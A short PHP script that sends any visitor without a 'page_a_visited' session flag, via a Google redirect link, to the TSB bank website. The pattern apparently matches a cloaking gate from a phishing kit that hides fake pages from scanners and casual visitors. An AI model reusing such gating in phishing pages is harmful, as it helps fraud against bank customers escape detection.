<?php
session_start();
if(!isset($_SESSION['page_a_visited'])){
        header("Location: https://www.google.co.uk/url?sa=t&rct=j&q=&esrc=s&source=web&cd=1&cad=rja&uact=8&ved=0CCEQFjAAahUKEwjBuoe4oZDIAhUCWhQKHSszDw8&url=http%3A%2F%2Fwww.tsb.co.uk%2F&usg=AFQjCNFLUC4YGrYerTgfv8Gakz2vymcKQw");
		die();

}
?>